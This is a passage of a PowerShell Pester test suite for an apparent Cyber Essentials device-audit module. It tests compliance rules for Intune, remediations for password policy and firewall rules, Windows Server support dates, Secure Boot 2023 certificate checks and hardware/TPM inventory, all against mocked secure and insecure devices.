        Set-TestDevice -Kind Insecure
        $f = @(Invoke-CEAuditCore)
        $summary = Get-CESummary -Findings $f
        $map = Get-CEStatusCheckMap -Findings $f
        $map.'FW-01'.scope | Should -Be 'Machine'
        @($map.'FW-01'.frameworks) | Should -Not -BeNullOrEmpty
        $roll = Get-CEFrameworkRollup -CheckMap $map -Summary $summary
        ($roll.'ce-v3.3'.met + $roll.'ce-v3.3'.attention + $roll.'ce-v3.3'.confirm) | Should -Be $roll.'ce-v3.3'.applicable
        $roll.'ce-v3.3'.metPct | Should -BeGreaterOrEqual 0
        $roll.'ce-v3.3'.metPct | Should -BeLessOrEqual 100
        $roll.'ce-plus'.total | Should -Be 5
        $st = ConvertTo-CEStatus -Findings $f -Summary $summary -Context $global:CETestCtx
        @($st.PSObject.Properties.Name) | Should -Not -Contain 'Verdict'
        $st.scope | Should -Be 'Machine'
    }

    It 'discovery output is one line of JSON with every rule setting and the right types' {
        $root = Join-Path $TestDrive 'insecure2'
        New-TestStatus -Kind Insecure -DataRoot $root | Out-Null
        $json = Get-CEComplianceData -DataRoot $root -Installed $true -NoKick | ConvertTo-Json -Compress
        $json | Should -Not -Match "`n"
        foreach ($rules in @($script:strictRules, $script:softRules, $script:fwRules)) {
            $eval = Test-CEComplianceRules -DiscoveryOutput $json -RulesPath $rules
            $eval.Problems | Should -BeNullOrEmpty
            @($eval.Rules | Where-Object { @('NotDiscovered', 'TypeError') -contains $_.State }).Count | Should -Be 0
        }
    }

    It 'framework rules gate on coverage: an insecure device is non-compliant, naming CEv33MetPct' {
        $root = Join-Path $TestDrive 'fw-insecure'
        New-TestStatus -Kind Insecure -DataRoot $root | Out-Null
        $data = Get-CEComplianceData -DataRoot $root -Installed $true -NoKick
        $data.CEv33MetPct | Should -BeGreaterOrEqual 0
        $eval = Test-CEComplianceRules -DiscoveryOutput ($data | ConvertTo-Json -Compress) -RulesPath $script:fwRules
        $eval.Compliant | Should -BeFalse
        @($eval.Rules | Where-Object State -eq 'NonCompliant').SettingName | Should -Contain 'CEv33MetPct'
    }

    It 'reports an insecure device as non-compliant, naming the failing rules' {
        $root = Join-Path $TestDrive 'insecure3'
        New-TestStatus -Kind Insecure -DataRoot $root | Out-Null
        $data = Get-CEComplianceData -DataRoot $root -Installed $true -NoKick
        $data.CEAutoFailCount | Should -BeGreaterThan 0
        $data.CEPatchingOK | Should -BeFalse
        $data.CEFailing | Should -Match 'SU-03'
        $eval = Test-CEComplianceRules -DiscoveryOutput ($data | ConvertTo-Json -Compress) -RulesPath $script:softRules
        $eval.Compliant | Should -BeFalse
        $bad = @($eval.Rules | Where-Object State -eq 'NonCompliant').SettingName
        $bad | Should -Contain 'CEAutoFailCount'
        $bad | Should -Contain 'CEAntimalwareOK'
        ($eval.Rules | Where-Object SettingName -eq 'CEAutoFailCount').Detail | Should -Match '^This device has \d+ issue'
    }

    It 'reports a hardened, attested device as compliant under the strict rules' {
        $root = Join-Path $TestDrive 'secure'
        $st = New-TestStatus -Kind Secure -DataRoot $root -AttestMfa
        $st.autoFailCount | Should -Be 0
        $data = Get-CEComplianceData -DataRoot $root -Installed $true -NoKick
        $eval = Test-CEComplianceRules -DiscoveryOutput ($data | ConvertTo-Json -Compress) -RulesPath $script:strictRules
        ($eval.Rules | Where-Object State -ne 'Compliant' | ForEach-Object { "$($_.SettingName)=$($_.Actual)" }) -join ', ' | Should -BeNullOrEmpty
        $eval.Compliant | Should -BeTrue
    }

    It 'is non-compliant when the audit is stale' {
        $root = Join-Path $TestDrive 'stale'
        New-TestStatus -Kind Secure -DataRoot $root -AttestMfa | Out-Null
        $data = Get-CEComplianceData -DataRoot $root -Installed $true -NoKick -Now ([datetime]::UtcNow.AddHours(100))
        $data.CEAuditAgeHours | Should -BeGreaterOrEqual 100
        $eval = Test-CEComplianceRules -DiscoveryOutput ($data | ConvertTo-Json -Compress) -RulesPath $script:softRules
        @($eval.Rules | Where-Object State -eq 'NonCompliant').SettingName | Should -Be @('CEAuditAgeHours')
    }

    It 'never reports compliant when nothing is installed or no audit has run' {
        $data = Get-CEComplianceData -DataRoot (Join-Path $TestDrive 'empty') -Installed $false -NoKick
        $data.CEAutoFailCount | Should -Be -1
        foreach ($rules in @($script:strictRules, $script:softRules)) {
            (Test-CEComplianceRules -DiscoveryOutput ($data | ConvertTo-Json -Compress) -RulesPath $rules).Compliant | Should -BeFalse
        }
    }

    It 'the rules evaluator flags missing settings and type mismatches' {
        $eval = Test-CEComplianceRules -DiscoveryOutput '{"CECheckerInstalled":"yes"}' -RulesPath $script:softRules
        ($eval.Rules | Where-Object SettingName -eq 'CECheckerInstalled').State | Should -Be 'TypeError'
        ($eval.Rules | Where-Object SettingName -eq 'CEAuditAgeHours').State | Should -Be 'NotDiscovered'
        (Test-CEComplianceRules -DiscoveryOutput "{`"a`":1,`n`"b`":2}" -RulesPath $script:softRules).Problems | Should -Match 'single line'
    }

    It 'rules files stay within Intune limits and use only supported operators and types' {
        foreach ($f in @($script:strictRules, $script:softRules)) {
            (Get-Item $f).Length | Should -BeLessThan 100KB
            $rules = (Get-Content $f -Raw | ConvertFrom-Json).Rules
            foreach ($r in $rules) {
                @('IsEquals', 'NotEquals', 'GreaterThan', 'GreaterEquals', 'LessThan', 'LessEquals') | Should -Contain $r.Operator
                @('Boolean', 'Int64', 'Double', 'String', 'DateTime', 'Version') | Should -Contain $r.DataType
                @($r.RemediationStrings | Where-Object Language -eq 'en_US').Count | Should -Be 1
            }
        }
    }

    It 'the Win32 detection script requires the current module version' {
        $v = (Import-PowerShellDataFile (Join-Path (Join-Path (Join-Path $script:RepoRoot 'src') 'CEAudit') 'CEAudit.psd1')).ModuleVersion
        (Get-Content (Join-Path $script:intune 'Detect-CEChecker.ps1') -Raw) | Should -Match ([regex]::Escape("[version]'$v'"))
    }

    It 'Remediations detection prints a summary and exits 1 when not ready, 0 when ready' {
        $pwshExe = (Get-Process -Id $PID).Path
        $detect = Join-Path $script:intune 'Detect-CECompliance.ps1'
        $bad = Join-Path $TestDrive 'pd-bad'
        New-TestStatus -Kind Insecure -DataRoot (Join-Path $bad 'EngramicBaseline') | Out-Null
        $good = Join-Path $TestDrive 'pd-good'
        New-TestStatus -Kind Secure -DataRoot (Join-Path $good 'EngramicBaseline') -AttestMfa | Out-Null

        $saved = $env:ProgramData
        try {
            $env:ProgramData = $bad
            $out = & $pwshExe -NoProfile -File $detect
            $LASTEXITCODE | Should -Be 1
            "$out" | Should -Match '^AUTO-FAIL \| autofail=[1-9]'
            $env:ProgramData = $good
            $out = & $pwshExe -NoProfile -File $detect
            "$out" | Should -Match '^(OK|REVIEW|ATTENTION)'
            if ("$out" -like 'OK*') { $LASTEXITCODE | Should -Be 0 } else { $LASTEXITCODE | Should -Be 1 }
            $env:ProgramData = Join-Path $TestDrive 'pd-none'
            $out = & $pwshExe -NoProfile -File $detect
            $LASTEXITCODE | Should -Be 1
            "$out" | Should -Match '^NO_DATA'
        }
        finally { $env:ProgramData = $saved }
    }
}

Describe 'Headless scheduled audit' {
    It 'runs end to end in a fresh process and writes status, report and log' {
        $pwshExe = (Get-Process -Id $PID).Path
        $root = Join-Path $TestDrive 'headless'
        # Keep the test offline: turn the firmware catalog off through the data-root config override.
        New-Item -ItemType Directory -Path (Join-Path $root 'config') -Force | Out-Null
        Get-Content (Join-Path (Join-Path $script:RepoRoot 'config') 'firmware-catalog.json') -Raw | ConvertFrom-Json |
            ForEach-Object { $_.baseUrl = ''; $_ } | ConvertTo-Json | Set-Content (Join-Path (Join-Path $root 'config') 'firmware-catalog.json') -Encoding UTF8
        & $pwshExe -NoProfile -File (Join-Path $script:RepoRoot 'app\Invoke-CEScheduledAudit.ps1') -DataRoot $root *> $null
        $LASTEXITCODE | Should -Be 0
        $status = Get-Content (Join-Path $root 'status.json') -Raw | ConvertFrom-Json
        $status.SchemaVersion | Should -Be 1
        # SYSTEM runs Machine-scope checks only; shadow-AI/WSL (User scope) come from Invoke-CEUserProbe.ps1.
        @($status.Checks.PSObject.Properties).Count | Should -Be @(Get-CECheck -Scope 'Machine').Count
        $status.Checks.PSObject.Properties.Name | Should -Not -Contain 'UA-10'
        Test-Path (Join-Path $status.ReportFolder 'report.html') | Should -BeTrue
        @(Get-ChildItem (Join-Path $root 'logs') -Filter 'audit-*.log').Count | Should -Be 1
        Test-Path (Join-Path $root 'last-error.json') | Should -BeFalse
    }
}

Describe 'Per-user probe' {
    It 'runs end to end in a fresh process and writes user-status.json (User scope only)' {
        $pwshExe = (Get-Process -Id $PID).Path
        $root = Join-Path $TestDrive 'userprobe'
        & $pwshExe -NoProfile -File (Join-Path $script:RepoRoot 'app\Invoke-CEUserProbe.ps1') -DataRoot $root -Quiet *> $null
        $LASTEXITCODE | Should -Be 0
        $s = Get-Content (Join-Path $root 'user-status.json') -Raw | ConvertFrom-Json
        $s.scope | Should -Be 'User'
        $s.schemaVersion | Should -Be 1
        # same contract as the device status: self-describing checks, derived frameworks, plus the AI block
        $s.checks.'UA-10'.scope | Should -Be 'User'
        @($s.checks.PSObject.Properties.Name) | Should -Not -Contain 'FW-01'
        $s.frameworks.'ce-v3.3' | Should -Not -BeNullOrEmpty
        $s.ai | Should -Not -BeNullOrEmpty
        $s.ai.PSObject.Properties.Name | Should -Contain 'agentsFound'
        $s.ai.PSObject.Properties.Name | Should -Contain 'environments'
        $s.ai.contained | Should -BeIn @($true, $false)
        Test-Path (Join-Path $root 'last-error.json') | Should -BeFalse
    }

    It 'Get-CEAiPosture returns an AI inventory block' {
        $p = Get-CEAiPosture
        @($p.Keys) | Should -Contain 'agentsFound'
        @($p.Keys) | Should -Contain 'contained'
        @($p.Keys) | Should -Contain 'deviations'
        @($p.Keys) | Should -Contain 'environments'
        $p.contained | Should -BeOfType [bool]
    }
}

Describe 'Check scope (Machine vs User)' {
    It 'every check has a Machine or User scope' {
        foreach ($c in Get-CECheck) { $c.Scope | Should -BeIn @('Machine', 'User') -Because $c.Id }
    }
    It 'shadow-AI and WSL checks are User scope' {
        (Get-CECheck -Id 'UA-10').Scope | Should -Be 'User'
        (Get-CECheck -Id 'SC-12').Scope | Should -Be 'User'
    }
    It 'device checks are Machine scope' {
        (Get-CECheck -Id 'FW-01').Scope | Should -Be 'Machine'
        (Get-CECheck -Id 'SU-01').Scope | Should -Be 'Machine'
    }
    It 'Get-CECheck -Scope filters by scope' {
        @(Get-CECheck -Scope 'User').Id | Should -Contain 'UA-10'
        @(Get-CECheck -Scope 'Machine').Id | Should -Not -Contain 'UA-10'
        (@(Get-CECheck -Scope 'Machine').Count + @(Get-CECheck -Scope 'User').Count) | Should -Be @(Get-CECheck).Count
    }
    It 'Invoke-CEAuditCore -Scope User runs only User checks and tags findings' {
        $f = @(Invoke-CEAuditCore -Scope 'User')
        $f.Count | Should -BeGreaterThan 0
        ($f | Where-Object { $_.Scope -ne 'User' }) | Should -BeNullOrEmpty
        $f.CheckId | Should -Not -Contain 'FW-01'
    }
}

Describe 'Remediation parameters under strict mode' {
    BeforeAll { Set-TestDevice -Kind Insecure }

    It 'remediations only read required parameters directly (optional ones go through Get-CEParamValue)' {
        $dir = Join-Path (Join-Path (Join-Path $script:RepoRoot 'src') 'CEAudit') 'Remediations'
        $problems = @()
        foreach ($file in Get-ChildItem $dir -Filter *.ps1) {
            $ast = [System.Management.Automation.Language.Parser]::ParseFile($file.FullName, [ref]$null, [ref]$null)
            $calls = $ast.FindAll({ $args[0] -is [System.Management.Automation.Language.CommandAst] -and $args[0].GetCommandName() -eq 'Register-CERemediation' }, $true)
            foreach ($call in $calls) {
                $text = $call.Extent.Text
                $id = [regex]::Match($text, "-Id '([^']+)'").Groups[1].Value
                $required = @([regex]::Matches($text, "Assert-CEParam \`$p '(\w+)'([^\r\n]*)") |
                    Where-Object { $_.Groups[2].Value -notmatch '-Optional' } | ForEach-Object { $_.Groups[1].Value })
                $used = @([regex]::Matches($text, '\$p\.(\w+)') | ForEach-Object { $_.Groups[1].Value } |
                    Where-Object { $_ -ne 'ContainsKey' } | Sort-Object -Unique)
                foreach ($u in $used) {
                    if ($required -notcontains $u) { $problems += "${id}: `$p.$u is not a required parameter" }
                }
            }
        }
        $problems -join "`n" | Should -BeNullOrEmpty
    }

    It 'PasswordPolicy-Set works with only a minimum length (regression)' {
        InModuleScope CEAudit {
            Mock Invoke-CENative {
                if ($ArgumentList -contains 'accounts' -and $ArgumentList.Count -eq 1) {
                    return [pscustomobject]@{ ExitCode = 0; Output = @('a: Never', 'b: 0', 'c: 42', 'd: 0', 'e: None', 'f: 10', 'g: 10', 'h: 10', 'i: WORKSTATION') }
                }
                $script:netArgs = $ArgumentList
                [pscustomobject]@{ ExitCode = 0; Output = @('The command completed successfully.') }
            }
            $r = Invoke-CERemediation -Id 'PasswordPolicy-Set' -Parameters ([pscustomobject]@{ MinLength = 12 })
            $r.Message | Should -BeNullOrEmpty
            $r.Status | Should -Be 'Applied'
            $script:netArgs | Should -Contain '/minpwlen:12'
            $script:netArgs | Should -Not -Contain '/maxpwage:unlimited'
            $r.Undo[0].Command | Should -Be 'net.exe accounts /minpwlen:0'

            $r = Invoke-CERemediation -Id 'PasswordPolicy-Set' -Parameters @{ MaxAgeUnlimited = $true }
            $r.Status | Should -Be 'Applied'
            $script:netArgs | Should -Contain '/maxpwage:unlimited'
            $r.Undo[0].Command | Should -Be 'net.exe accounts /maxpwage:42'
        }
    }

    It 'every changeset item from an insecure device passes its own validation' {
        $f = @(Invoke-CEAuditCore)
        $cs = New-CEChangeset -Findings $f -Context (New-TestContext)
        $json = $cs | ConvertTo-Json -Depth 8 | ConvertFrom-Json
        InModuleScope CEAudit -Parameters @{ Items = @($json.Items) } {
            param($Items)
            Mock Get-NetFirewallRule { [pscustomobject]@{ Name = $Name } }
            Mock Get-MpPreference { [pscustomobject]@{ ExclusionPath = @('C:\'); ExclusionExtension = @('exe'); ExclusionProcess = @() } }
            $bad = @()
            foreach ($i in $Items) {
                $rem = Get-CERemediation -Id $i.RemediationId
                try { & $rem.Validate (ConvertTo-CEHashtable $i.Parameters) }
                catch { $bad += "$($i.ItemId) $($i.RemediationId): $($_.Exception.Message)" }
            }
            $bad -join "`n" | Should -BeNullOrEmpty
        }
    }
}

Describe 'Firewall rule remediation' {
    BeforeAll { Set-TestDevice -Kind Insecure }

    It 'accepts real Windows rule names with paths and braces' {
        InModuleScope CEAudit {
            $name = 'UDP Query User{A20A6EC8-FCD2-43F9-A42B-594FBB53F664}C:\Program Files\ExampleApp\bin\example-native.exe'
            Mock Get-NetFirewallRule { [pscustomobject]@{ Name = $name } }
            Mock Disable-NetFirewallRule { }
            $r = Invoke-CERemediation -Id 'FW-DisableRule' -Parameters @{ RuleName = $name; DisplayName = 'sherpa-onnx-ws-win32-x64.exe' }
            $r.Message | Should -BeNullOrEmpty
            $r.Status | Should -Be 'Applied'
            Should -Invoke Disable-NetFirewallRule -Times 1 -ParameterFilter { $Name -eq $name }
            $r.Undo[0].Command | Should -Be ("Enable-NetFirewallRule -Name '" + $name + "'")
        }
    }

    It 'rejects wildcards and names that do not match exactly one rule' {
        InModuleScope CEAudit {
            Mock Get-NetFirewallRule { @([pscustomobject]@{ Name = 'a' }, [pscustomobject]@{ Name = 'b' }) }
            { Invoke-CERemediation -Id 'FW-DisableRule' -Parameters @{ RuleName = '*' } } | Should -Throw '*not allowed*'
            { Invoke-CERemediation -Id 'FW-DisableRule' -Parameters @{ RuleName = 'Rule[1]' } } | Should -Throw '*not allowed*'
            { Invoke-CERemediation -Id 'FW-DisableRule' -Parameters @{ RuleName = 'c' } } | Should -Throw '*not found*'
        }
    }
}

Describe 'Windows Server support' {
    It 'recognises Windows Server even when the build matches a Windows 11 release' {
        InModuleScope CEAudit {
            $reg = @{ CurrentBuildNumber = '26100'; UBR = 4946; DisplayVersion = '24H2'; EditionID = 'ServerDatacenter'; ProductName = 'Windows Server 2025 Datacenter'; InstallationType = 'Server' }
            Mock Get-CERegistryValue { if ($reg.ContainsKey($Name)) { $reg[$Name] } else { $Default } }
            Mock Get-CEDsregStatus { @{} }
            Mock Test-CEMdmEnrolled { $false }
            Mock Get-CEConsoleUser { '' }
            Mock Get-CimInstance { [pscustomobject]@{ PartOfDomain = $false } }
            $ctx = Get-CEDeviceContext -Force
            $ctx.OSFamily | Should -Be 'Windows Server'
            $ctx.EditionClass | Should -Be 'Server'
            $reg.InstallationType = 'Client'; $reg.EditionID = 'Professional'
            (Get-CEDeviceContext -Force).OSFamily | Should -Be 'Windows 11'
            $script:CEDeviceContext = $null
        }
    }

    It 'passes a supported server, warns near the end date and fails after it' {
        Set-TestDevice -Kind Secure -ContextOverride @{ OSFamily = 'Windows Server'; EditionClass = 'Server'; EditionID = 'ServerDatacenter'; Build = 26100; FullBuild = '26100.4946' }
        $f = @(Invoke-CEAuditCore -Id 'SU-01') | Where-Object { -not $_.Subject }
        $f.Status | Should -Be 'Pass'
        $f.Actual | Should -Match 'Windows Server 2025.*2034-11-14'

        Set-TestDevice -Kind Secure -ContextOverride @{ OSFamily = 'Windows Server'; EditionClass = 'Server'; Build = 14393; FullBuild = '14393.8000' }
        Mock -ModuleName CEAudit Get-Date { [datetime]'2026-12-01' } -ParameterFilter { -not $Date -and -not $Format }
        $f = @(Invoke-CEAuditCore -Id 'SU-01') | Where-Object { -not $_.Subject }
        $f.Status | Should -Be 'Warn'
        $f.Actual | Should -Match '2016.*2027-01-12'

        Mock -ModuleName CEAudit Get-Date { [datetime]'2027-02-01' } -ParameterFilter { -not $Date -and -not $Format }
        $f = @(Invoke-CEAuditCore -Id 'SU-01') | Where-Object { -not $_.Subject }
        $f.Status | Should -Be 'Fail'
        $f.AutoFail | Should -BeTrue
    }

    It 'asks for a manual check on an unknown server build' {
        Set-TestDevice -Kind Secure -ContextOverride @{ OSFamily = 'Windows Server'; EditionClass = 'Server'; Build = 9600; FullBuild = '9600.1' }
        $f = @(Invoke-CEAuditCore -Id 'SU-01') | Where-Object { -not $_.Subject }
        $f.Status | Should -Be 'Manual'
    }
}

Describe 'Secure Boot 2023 certificates (NC-08)' {
    BeforeEach {
        Set-TestDevice -Kind Secure
        $reg = $global:CETestReg
        $reg.Remove('HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\Servicing|UEFICA2023Status')
        $reg.Remove('HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\Servicing|WindowsUEFICA2023Capable')
        $global:CETestSbVars = @{ db = 'Microsoft Windows Production PCA 2011 Microsoft Corporation UEFI CA 2011'; KEK = 'Microsoft Corporation KEK CA 2011' }
        $global:CETestCtx.AuditTime = [datetime]'2026-05-01'
    }

    It 'the fake Secure Boot data contains every certificate name the config says is replaced' {
        $cfg = Get-Content (Join-Path (Join-Path $script:RepoRoot 'config') 'secure-boot.json') -Raw | ConvertFrom-Json
        foreach ($kind in 'Secure', 'Insecure') {
            Set-TestDevice -Kind $kind
            foreach ($cert in @($cfg.certificates)) {
                $global:CETestSbVars[[string]$cert.variable] | Should -BeLike "*$($cert.replaces)*" -Because "$kind device $($cert.variable) should hold '$($cert.replaces)'"
            }
        }
    }

    It 'passes when the 2023 certificates and boot manager are in place' {
        Set-TestDevice -Kind Secure
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        $f.Count | Should -Be 5
        @($f | Where-Object Status -ne 'Pass').FindingId | Should -BeNullOrEmpty
    }

    It 'warns before the 2011 CAs expire and offers the fix' {
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        $kek = $f | Where-Object Subject -eq 'Microsoft Corporation KEK 2K CA 2023'
        $db = $f | Where-Object Subject -eq 'Windows UEFI CA 2023'
        $kek.Status | Should -Be 'Warn'
        $kek.Actual | Should -Match 'expires on 2026-06-24'
        $db.Status | Should -Be 'Warn'
        $db.Remediation.Id | Should -Be 'SecureBoot-Deploy2023Certs'
        ($f | Where-Object Subject -eq 'Microsoft UEFI CA 2023').Severity | Should -Be 'Low'
        ($f | Where-Object Subject -eq 'Boot manager').Status | Should -Be 'Warn'
        $cs = New-CEChangeset -Findings $f -Context (New-TestContext)
        @($cs.Items | Where-Object RemediationId -eq 'SecureBoot-Deploy2023Certs').Count | Should -Be 1
        ($cs.Items | Where-Object RemediationId -eq 'SecureBoot-Deploy2023Certs').Selected | Should -BeFalse
    }

    It 'fails once the replaced CA has expired' {
        $global:CETestCtx.AuditTime = [datetime]'2026-10-20'
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        ($f | Where-Object Subject -eq 'Windows UEFI CA 2023').Status | Should -Be 'Fail'
        ($f | Where-Object Subject -eq 'Windows UEFI CA 2023').Actual | Should -Match 'expired on 2026-10-19'
        ($f | Where-Object Subject -eq 'Microsoft Corporation KEK 2K CA 2023').Status | Should -Be 'Fail'
    }

    It 'skips the optional third-party CAs when the 2011 third-party CA is not trusted' {
        $global:CETestSbVars.db = 'Microsoft Windows Production PCA 2011'
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        @($f | Where-Object Subject -match 'Microsoft UEFI CA 2023|Option ROM').Count | Should -Be 0
    }

    It 'points at the manufacturer when event 1803 says there is no PK-signed KEK' {
        $global:CETestSbEvents = @([pscustomobject]@{ Id = 1803; TimeCreated = [datetime]'2026-04-30' })
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        $kek = $f | Where-Object Subject -eq 'Microsoft Corporation KEK 2K CA 2023'
        $kek.Recommendation | Should -Match 'manufacturer'
        $kek.Remediation | Should -BeNullOrEmpty
        ($f | Where-Object Subject -eq 'Windows UEFI CA 2023').Remediation.Id | Should -Be 'SecureBoot-Deploy2023Certs'
        @($kek.Evidence) | Should -Contain 'Event 1803 last logged 2026-04-30 00:00'
    }

    It 'asks for a restart instead of a fix while an update is in progress' {
        $global:CETestReg['HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\Servicing|UEFICA2023Status'] = 'InProgress'
        $global:CETestReg['HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\Servicing|WindowsUEFICA2023Capable'] = 1
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        @($f | Where-Object { $_.Remediation }).Count | Should -Be 0
        ($f | Where-Object Subject -eq 'Windows UEFI CA 2023').Recommendation | Should -Match 'restart'
    }

    It 'treats event 1800 as in progress only when no success event is newer' {
        $global:CETestSbEvents = @([pscustomobject]@{ Id = 1800; TimeCreated = [datetime]'2026-04-29' })
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        @($f | Where-Object { $_.Remediation }).Count | Should -Be 0

        $global:CETestSbEvents = @([pscustomobject]@{ Id = 1800; TimeCreated = [datetime]'2026-04-28' }, [pscustomobject]@{ Id = 1036; TimeCreated = [datetime]'2026-04-29' })
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        ($f | Where-Object Subject -eq 'Windows UEFI CA 2023').Remediation.Id | Should -Be 'SecureBoot-Deploy2023Certs'
        ($f | Where-Object Subject -eq 'Windows UEFI CA 2023').Recommendation | Should -Not -Match 'already in progress'

        $global:CETestSbEvents = @([pscustomobject]@{ Id = 1036; TimeCreated = [datetime]'2026-04-28' }, [pscustomobject]@{ Id = 1800; TimeCreated = [datetime]'2026-04-29' })
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        @($f | Where-Object { $_.Remediation }).Count | Should -Be 0
    }

    It 'reports an unreadable variable as Manual' {
        $global:CETestSbVars = @{ db = $null; KEK = $null }
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        ($f | Where-Object Subject -eq 'Windows UEFI CA 2023').Status | Should -Be 'Manual'
    }

    It 'is not applicable when Secure Boot is off' {
        $global:CETestSecure = $false
        $f = @(Invoke-CEAuditCore -Id 'NC-08')
        $f.Status | Should -Be 'NotApplicable'
    }

    It 'the fix refuses to run without Secure Boot, and otherwise sets the trigger and starts the task' {
        InModuleScope CEAudit {
            Mock New-ItemProperty { $script:sbSet = "$Name=$Value" }
            Mock Start-ScheduledTask { $script:sbTask = "$TaskPath$TaskName" }
            $global:CETestSecure = $false
            (Invoke-CERemediation -Id 'SecureBoot-Deploy2023Certs' -Parameters @{}).Status | Should -Be 'Failed'
            $global:CETestSecure = $true
            $r = Invoke-CERemediation -Id 'SecureBoot-Deploy2023Certs' -Parameters @{}
            $r.Status | Should -Be 'Applied'
            $script:sbSet | Should -Be 'AvailableUpdates=22852'
            @($r.Undo).Count | Should -Be 1
            $r.Undo[0].Command | Should -Match "-Name 'AvailableUpdates' -Value 0 -Type DWord$"
            $script:sbTask | Should -Be '\Microsoft\Windows\PI\Secure-Boot-Update'
        }
    }
}

Describe 'Hardware inventory and firmware (SU-08)' {
    Context 'version ranges' {
        It 'compares on the precision of the bounds' {
            InModuleScope CEAudit {
                Test-CEVersionInRange -Version '4.33.4' -From '4.0' -To '4.33' | Should -BeTrue
                Test-CEVersionInRange -Version '4.34.0' -From '4.0' -To '4.33' | Should -BeFalse
                Test-CEVersionInRange -Version '4.41.2' -From '4.40' -To '4.42' | Should -BeTrue
                Test-CEVersionInRange -Version '7.63.3353.0' -From '7.0' -To '7.61' | Should -BeFalse
                Test-CEVersionInRange -Version '11.8.50.3399' -From '11.8.0' -To '11.8.69' | Should -BeTrue
                Test-CEVersionInRange -Version '11.8.70.1' -From '11.8.0' -To '11.8.69' | Should -BeFalse
                Test-CEVersionInRange -Version '73.8.17568.5511' -From '73.8' -To '73.8' | Should -BeTrue
                Test-CEVersionInRange -Version '' -From '1.0' -To '2.0' | Should -BeFalse
                Test-CEVersionInRange -Version 'abc' -From '1.0' -To '2.0' | Should -BeFalse
            }
        }

        It 'every advisory in the shipped list is well formed' {
            $list = Get-Content (Join-Path (Join-Path $script:RepoRoot 'config') 'tpm-firmware-advisories.json') -Raw | ConvertFrom-Json
            $list.lastReviewed | Should -Match '^\d{4}-\d{2}-\d{2}$'
            foreach ($a in @($list.advisories)) {
                @($a.manufacturers).Count | Should -BeGreaterThan 0 -Because $a.id
                @($a.cves).Count | Should -BeGreaterThan 0 -Because $a.id
                $a.advice | Should -Not -BeNullOrEmpty -Because $a.id
                foreach ($r in @($a.affected)) {
                    InModuleScope CEAudit -Parameters @{ R = $r; Id = $a.id } {
                        param($R, $Id)
                        Test-CEVersionInRange -Version $R.from -From $R.from -To $R.to | Should -BeTrue -Because "$Id $($R.from)-$($R.to)"
                        Test-CEVersionInRange -Version $R.to -From $R.from -To $R.to | Should -BeTrue -Because "$Id $($R.from)-$($R.to)"
                    }
                }
            }
        }
    }

    Context 'collection' {
        It 'reads model, serial, BIOS, TPM, CPU and disks from CIM and the registry' {
            InModuleScope CEAudit {
                Mock Get-CimInstance {
                    switch ($ClassName) {
                        'Win32_ComputerSystem' { [pscustomobject]@{ Manufacturer = 'Dell Inc. '; Model = 'Latitude 7450'; SystemSKUNumber = '0C9E' } }
                        'Win32_BIOS' { [pscustomobject]@{ Manufacturer = 'Dell Inc.'; SMBIOSBIOSVersion = '1.12.1'; ReleaseDate = [datetime]'2025-03-04'; SerialNumber = 'ABC1234' } }
                        'Win32_BaseBoard' { [pscustomobject]@{ Manufacturer = 'Dell Inc.'; Product = '0ABC12' } }
                        'Win32_Tpm' { [pscustomobject]@{ ManufacturerId = [uint32]0x49465800; ManufacturerVersion = '7.85.4555.0'; SpecVersion = '2.0, 0, 1.59' } }
                        'Win32_Processor' { [pscustomobject]@{ Name = ' Intel(R) Core(TM) Ultra 7 165U '; Manufacturer = 'GenuineIntel'; NumberOfCores = 12; NumberOfLogicalProcessors = 14 } }
                        'Win32_DiskDrive' { [pscustomobject]@{ Model = 'KIOXIA 512GB'; FirmwareRevision = '11100106'; InterfaceType = 'SCSI'; Size = [uint64]512110190592; SerialNumber = ' 8CE3_8E10 ' } }
                    }
                }
                Mock Get-CERegistryValue {
                    if ($Name -eq 'PEFirmwareType') { return 2 }
                    if ($Name -eq 'Update Revision') { return [byte[]]@(0, 0, 0, 0, 0x1C, 0, 0, 0) }
                    return $Default
                }
                $hw = Get-CEHardwareInventory -IsElevated $true
                $hw.Manufacturer | Should -Be 'Dell Inc.'
                $hw.Model | Should -Be 'Latitude 7450'
                $hw.SystemSku | Should -Be '0C9E'
                $hw.SerialNumber | Should -Be 'ABC1234'
                $hw.Baseboard | Should -Be 'Dell Inc. 0ABC12'
                $hw.IsVirtualMachine | Should -BeFalse
                $hw.Firmware.Version | Should -Be '1.12.1'
                $hw.Firmware.ReleaseDate | Should -Be '2025-03-04'
                $hw.Firmware.Type | Should -Be 'UEFI'
                $hw.Tpm.Readable | Should -BeTrue
                $hw.Tpm.Manufacturer | Should -Be 'IFX'
                $hw.Tpm.FirmwareVersion | Should -Be '7.85.4555.0'
                $hw.Tpm.SpecVersion | Should -Be '2.0'
                $hw.Cpu[0].Name | Should -Be 'Intel(R) Core(TM) Ultra 7 165U'
                $hw.Cpu[0].MicrocodeRevision | Should -Be '0x1C' -Because 'older Intel systems store 8 bytes with the revision in the upper half'
                $hw.Disks[0].SizeGB | Should -Be 477
                $hw.Disks[0].SerialNumber | Should -Be '8CE3_8E10'
                @($hw.Errors).Count | Should -Be 0
            }
        }

        It 'does not read the TPM without elevation, and survives missing or odd CIM data' {
            InModuleScope CEAudit {
                Mock Get-CimInstance {
                    if ($ClassName -eq 'Win32_DiskDrive') { throw 'Access denied' }
                    [pscustomobject]@{ PartOfDomain = $false }
                }
                Mock Get-CERegistryValue { $Default }
                $hw = Get-CEHardwareInventory -IsElevated $false
                $hw.Tpm.Readable | Should -BeFalse
                $hw.Firmware.ReleaseDate | Should -BeNullOrEmpty
                @($hw.Cpu).Count | Should -Be 0
                @($hw.Disks).Count | Should -Be 0
                @($hw.Errors) -join ' ' | Should -Match 'Win32_DiskDrive'
                Should -Invoke Get-CimInstance -Times 0 -ParameterFilter { $ClassName -eq 'Win32_Tpm' }
            }
        }

